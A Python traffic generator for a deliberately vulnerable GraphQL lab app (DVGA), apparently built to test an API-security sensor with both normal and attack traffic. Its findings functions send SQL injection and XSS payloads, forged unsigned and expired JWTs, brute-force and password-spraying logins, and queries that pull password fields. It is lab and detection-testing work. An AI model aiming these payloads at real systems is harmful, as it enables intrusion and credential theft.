#!/usr/bin/env python3
"""
dvga_traffic.py
===============
Traffic generator for a DVGA lab instance monitored by an API-security sensor.

DVGA (https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application) is a
deliberately vulnerable "vulnerable-on-purpose" GraphQL app. Point base_url
at your own lab only.

All options live in a YAML config file (default: dvga_config.yaml).
Run with:
    python3 dvga_traffic.py                       # uses dvga_config.yaml
    python3 dvga_traffic.py --config other.yaml   # custom path

Phases (toggled in the config):
  warmup    - realistic, high-variety multi-consumer traffic (create user ->
              login -> paste CRUD) to advance the API through the learning
              period (build distinct-consumer count).
  findings  - detection patterns, split into three populations:
                authenticated    valid sessions (the known lab users, via
                                 me(token:) / createPaste / editPaste)
                unauthenticated  pre-auth GraphQL patterns (users password
                                 exposure, SQLi on pastes(filter:), weak
                                 passwords, injection reflection, brute force)
                bad-token        unsigned / expired / long-life JWTs passed
                                 to me(token:) (DVGA never verifies the sig)

NOTE on tokens: DVGA issues short-lived JWTs (120 s access / 30 s refresh)
and its get_identity() decodes with verify_signature=False, verify_exp=False
— the helpers re-login before every batch of authenticated calls.

Dependencies:  pip install requests pyyaml
"""

import argparse
import os
import random
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

import dvga_common as dv


# ── WARMUP: realistic multi-consumer traffic for the learning period ─────────
def one_consumer_journey(idx, cfg, base, tout):
    username = dv.rand_username("warm")
    email = dv.rand_email(username)
    pw = dv.rand_password()
    hdrs = dv.consumer_headers(idx)

    # 1. create the consumer account.
    r = dv.graphql(base, """
      mutation($u: String!, $e: String!, $p: String!) {
        createUser(userData: {username: $u, email: $e, password: $p}) {
          user { id username }
        }
      }
    """, {"u": username, "e": email, "p": pw}, cfg, hdrs, tout)
    dv.bump("warmup.create_user", r.status_code if r is not None else "err")

    # 2. fresh login; token is short-lived but the journey is a few quick calls.
    tok = dv.login_token(base, username, pw, cfg, hdrs, tout)
    dv.bump("warmup.login", "ok" if tok else "fail")
    if not tok:
        return

    title = dv.rand_paste_title("warm")
    # 3. normal authenticated-looking reads + writes.
    r = dv.graphql(base, 'query { me(token: "%s") { id username } }' % tok, None,
                   cfg, hdrs, tout)
    dv.bump("warmup.me", r.status_code if r is not None else "err")

    r = dv.graphql(base, "query { users { id username } }", None, cfg, hdrs, tout)
    dv.bump("warmup.users", r.status_code if r is not None else "err")

    r = dv.graphql(base, "query { pastes(public: true) { id title } }", None,
                   cfg, hdrs, tout)
    dv.bump("warmup.pastes_list", r.status_code if r is not None else "err")

    r = dv.graphql(base, """
      mutation($t: String!, $c: String!) {
        createPaste(title: $t, content: $c, public: true, burn: false) {
          paste { id title content public }
        }
      }
    """, {"t": title, "c": dv.rand_password()}, cfg, hdrs, tout)
    dv.bump("warmup.paste_add", r.status_code if r is not None else "err")

    data = dv.gql_data(r) or {}
    pid = ((data.get("createPaste") or {}).get("paste") or {}).get("id")
    if pid is not None:
        r = dv.graphql(base, 'query { paste(id: %s) { id title content } }' % pid,
                       None, cfg, hdrs, tout)
        dv.bump("warmup.own_paste", r.status_code if r is not None else "err")

    if idx % 5 == 0:
        r = dv.graphql(base, """
          mutation($id: Int, $t: String, $c: String) {
            editPaste(id: $id, title: $t, content: $c) { paste { id title } }
          }
        """, {"id": int(pid) if str(pid).isdigit() else 1,
              "t": title + " v2", "c": "updated content"}, cfg, hdrs, tout)
        dv.bump("warmup.paste_edit", r.status_code if r is not None else "err")


def run_warmup(count, threads, cfg, base, tout):
    print(f"[warmup] generating {count} distinct-consumer journeys ...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(one_consumer_journey, i, cfg, base, tout) for i in range(count)]
        done = 0
        for _ in as_completed(futs):
            done += 1
            if done % 250 == 0:
                print(f"  ... {done}/{count} consumers")
    print("[warmup] complete")


# ── AUTHENTICATED population ──────────────────────────────────────────────────
def run_authenticated(users, rounds, cfg, base, tout):
    print(f"[authenticated] {len(users)} users x {rounds} round(s) ...")
    for r_ in range(rounds):
        for idx, u in enumerate(users):
            username = u["username"]
            pw = u["password"]
            hdrs = dv.consumer_headers(1000 + idx + r_ * len(users))
            tok = dv.login_token(base, username, pw, cfg, hdrs, tout)
            if not tok:
                dv.bump("auth.login", "fail")
                continue
            dv.bump("auth.login", "ok")

            title = dv.rand_paste_title(f"a{r_}{idx}")
            r = dv.graphql(base, 'query { me(token: "%s") { id username } }' % tok,
                           None, cfg, hdrs, tout)
            dv.bump("auth.me", r.status_code if r is not None else "err")

            r = dv.graphql(base, "query { users { id username } }", None, cfg, hdrs, tout)
            dv.bump("auth.users", r.status_code if r is not None else "err")

            r = dv.graphql(base, "query { pastes(public: true) { id title } }", None,
                           cfg, hdrs, tout)
            dv.bump("auth.pastes_list", r.status_code if r is not None else "err")

            r = dv.graphql(base, """
              mutation($t: String!, $c: String!) {
                createPaste(title: $t, content: $c, public: true, burn: false) {
                  paste { id title }
                }
              }
            """, {"t": title, "c": dv.rand_password()}, cfg, hdrs, tout)
            dv.bump("auth.paste_add", r.status_code if r is not None else "err")

            data = dv.gql_data(r) or {}
            pid = ((data.get("createPaste") or {}).get("paste") or {}).get("id")
            if pid is not None and str(pid).isdigit():
                r = dv.graphql(base, """
                  mutation($id: Int, $t: String, $c: String) {
                    editPaste(id: $id, title: $t, content: $c) { paste { id title } }
                  }
                """, {"id": int(pid), "t": title + " v2", "c": "updated"},
                   cfg, hdrs, tout)
                dv.bump("auth.paste_edit", r.status_code if r is not None else "err")


# ── UNAUTHENTICATED population ────────────────────────────────────────────────
def f_excessive_data_exposure(cfg, base, tout):
    """DVGA's `users` query returns the plaintext `password` field for every
    user to any caller (admin sees the real value, others see '******'; the
    admin account itself exposes its real password). Fetch it and count."""
    r = dv.graphql(base, "query { users { id username password } }",
                   None, cfg, dv.consumer_headers(900), tout)
    dv.bump("unauth_debug", r.status_code if r is not None else "err")


def f_unauth_sensitive(cfg, base, tout, pool):
    """The me(token:) query hit with NO valid token / a blank token — the
    sensitive 'who am I' surface reached pre-auth."""
    other = pool[0] if pool else "admin"
    for bad in ("", "not-a-token", dv.make_jwt(other, alg="none")):
        r = dv.graphql(base, 'query { me(token: "%s") { id username password } }' % bad,
                       None, cfg, dv.consumer_headers(901), tout)
        dv.bump("unauth_sensitive", r.status_code if r is not None else "err")
    # users query pre-auth with password field requested
    r = dv.graphql(base, "query { users { id username password } }",
                   None, cfg, dv.consumer_headers(901), tout)
    dv.bump("unauth_sensitive", r.status_code if r is not None else "err")


def f_sensitive_query_params(cfg, base, tout):
    """Sensitive values (username/password/token) inside the GraphQL body —
    the GraphQL equivalent of credentials in the query string."""
    tok = dv.make_jwt("victim")
    r = dv.graphql(base, """
      mutation { login(username: "victim", password: "Secret123!") { accessToken } }
    """, None, cfg, dv.consumer_headers(905), tout)
    dv.bump("sensitive_query", r.status_code if r is not None else "err")
    r = dv.graphql(base, 'query { me(token: "%s") { username } }' % tok,
                   None, cfg, dv.consumer_headers(905), tout)
    dv.bump("sensitive_query", r.status_code if r is not None else "err")


def f_injection_reflection(cfg, base, tout):
    """XSS / SQLi payloads reflected into paste content (stored XSS + SQLi on
    the pastes filter)."""
    marker = "INJ" + uuid.uuid4().hex[:6]
    payloads = [f"<script>{marker}</script>", f"' OR '1'='{marker}",
                f"{marker}' UNION SELECT username,password FROM users --"]
    for p in payloads:
        r = dv.graphql(base, """
          mutation($t: String!, $c: String!) {
            createPaste(title: $t, content: $c, public: true, burn: false) {
              paste { id title }
            }
          }
        """, {"t": "inj " + marker, "c": p}, cfg, dv.consumer_headers(906), tout)
        dv.bump("injection", r.status_code if r is not None else "err")
        r = dv.graphql(base, "query { pastes(filter: \"%s\") { id title } }" % p,
                       None, cfg, dv.consumer_headers(906), tout)
        dv.bump("injection", r.status_code if r is not None else "err")


def f_weak_password(cfg, base, tout):
    for pw in ("123", "password", "abc", "111111", "qwerty"):
        name = dv.rand_username("weak")
        r = dv.graphql(base, """
          mutation($u: String!, $e: String!, $p: String!) {
            createUser(userData: {username: $u, email: $e, password: $p}) {
              user { id }
            }
          }
        """, {"u": name, "e": dv.rand_email(name), "p": pw},
           cfg, dv.consumer_headers(907), tout)
        dv.bump("weak_password", r.status_code if r is not None else "err")


def f_sqli_pastes(cfg, base, tout):
    """Classic DVGA SQLi on pastes(filter:)."""
    for q in ("' OR '1'='1", "' OR 1=1--", "1' OR '1'='1' --",
              "admin' UNION SELECT username,password,email FROM users --"):
        r = dv.graphql(base, "query { pastes(filter: \"%s\") { id title content } }" % q,
                       None, cfg, dv.consumer_headers(911), tout)
        dv.bump("sqli_pastes", r.status_code if r is not None else "err")


def f_tech_info_exposure(cfg, base, tout):
    """Malformed GraphQL / invalid JSON — does the stack trace come back?"""
    h = dv.consumer_headers(908)
    try:
        r = requests.post(f"{base}{dv.graphql_path(cfg)}",
                          data="{not:json,,}",
                          headers={**h, "Content-Type": "application/json"},
                          timeout=tout)
        dv.bump("tech_info", r.status_code)
    except requests.RequestException:
        dv.bump("tech_info", "err")
    r = dv.graphql(base, "query { users { username } bogusField }",
                   None, cfg, dv.consumer_headers(908), tout)
    dv.bump("tech_info", r.status_code if r is not None else "err")
    r = dv.graphql(base, "query { nonExistentField }",
                   None, cfg, dv.consumer_headers(908), tout)
    dv.bump("tech_info", r.status_code if r is not None else "err")


def f_excessive_single_user(cfg, base, tout, target):
    for i in range(40 * 1):
        r = dv.graphql(base, """
          mutation { login(username: "%s", password: "wrong%s") { accessToken } }
        """ % (target, i), None, cfg, dv.consumer_headers(909), tout)
        ok = dv.gql_ok(r)
        dv.bump("excessive_single", "ok" if ok else "fail")


def f_excessive_across_users(cfg, base, tout, pool_usernames):
    pool = list(pool_usernames) + [f"target{i}" for i in range(60)]
    for i in range(40):
        name = pool[i % len(pool)]
        r = dv.graphql(base, """
          mutation { login(username: "%s", password: "Password123!") { accessToken } }
        """ % name, None, cfg, dv.consumer_headers(910 + i), tout)
        ok = dv.gql_ok(r)
        dv.bump("excessive_across", "ok" if ok else "fail")


def run_unauthenticated(cfg, base, tout, intensity, pool_usernames, brute_target):
    print("[unauthenticated] generating no-token + pre-auth patterns ...")
    f_excessive_data_exposure(cfg, base, tout)
    f_unauth_sensitive(cfg, base, tout, pool_usernames)
    f_sensitive_query_params(cfg, base, tout)
    f_injection_reflection(cfg, base, tout)
    f_weak_password(cfg, base, tout)
    f_sqli_pastes(cfg, base, tout)
    f_tech_info_exposure(cfg, base, tout)
    f_excessive_single_user(cfg, base, tout, brute_target)
    f_excessive_across_users(cfg, base, tout, pool_usernames)
    print("[unauthenticated] complete")


# ── BAD-TOKEN population ──────────────────────────────────────────────────────
def _me_with(cfg, base, key, token, hdrs, tout):
    r = dv.graphql(base, 'query { me(token: "%s") { id username password } }' % token,
                   None, cfg, hdrs, tout)
    dv.bump(key, r.status_code if r is not None else "err")


def run_bad_tokens(cfg, base, tout, first_user):
    print("[bad-token] generating unsigned / expired / long-life JWTs ...")
    _me_with(cfg, base, "unsigned_jwt", dv.make_jwt(first_user, alg="none"),
             dv.consumer_headers(901), tout)
    _me_with(cfg, base, "expired_jwt", dv.make_jwt(first_user, alg="HS256", exp_delta=-86400),
             dv.consumer_headers(902), tout)
    _me_with(cfg, base, "longlife_jwt",
             dv.make_jwt(first_user, alg="HS256", exp_delta=10 * 365 * 86400),
             dv.consumer_headers(903), tout)
    # BOLA + bad token: read another user's record with a forged token
    _me_with(cfg, base, "badauth_bola", dv.make_jwt("operator", alg="none"),
             dv.consumer_headers(904), tout)
    # users query with password field under a forged admin token context
    r = dv.graphql(base, "query { users { id username password } }",
                   None, cfg, dv.consumer_headers(904), tout)
    dv.bump("badauth_bola", r.status_code if r is not None else "err")


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="DVGA lab traffic generator (config-driven)")
    ap.add_argument("--config", default="dvga_config.yaml",
                    help="path to the YAML config file (default: dvga_config.yaml)")
    args = ap.parse_args()

    if not os.path.exists(args.config) and os.path.exists(os.path.join(os.path.dirname(__file__), args.config)):
        args.config = os.path.join(os.path.dirname(__file__), args.config)

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)

    runc = cfg.get("run", {}) or {}
    do_warmup = bool(runc.get("warmup", False))
    do_findings = bool(runc.get("findings", False))

    wc = cfg.get("warmup", {}) or {}
    consumers = int(wc.get("consumers", 2500))
    threads = int(wc.get("threads", 16))

    fc = cfg.get("findings", {}) or {}
    auth_rounds = int(fc.get("auth_rounds", 3))
    intensity = int(fc.get("intensity", 1))
    brute_target = dv.brute_target(cfg)

    if not (do_warmup or do_findings):
        sys.exit("Nothing to do: set run.warmup and/or run.findings to true in the config.")

    print(f"config: {args.config}")
    print(f"target: {base} (graphql at {dv.graphql_path(cfg)})")
    start = time.time()
    timings = {}

    if do_warmup:
        t0 = time.time()
        run_warmup(consumers, threads, cfg, base, tout)
        timings["warmup"] = time.time() - t0

    if do_findings:
        t0 = time.time()
        users = dv.known_users(cfg)
        pool_usernames = dv.known_usernames(cfg)
        first_user = pool_usernames[0] if pool_usernames else "admin"
        run_authenticated(users, auth_rounds, cfg, base, tout)
        run_unauthenticated(cfg, base, tout, intensity, pool_usernames, brute_target)
        run_bad_tokens(cfg, base, tout, first_user)
        timings["findings"] = time.time() - t0

    dv.print_summary(timings, time.time() - start)


if __name__ == "__main__":
    main()
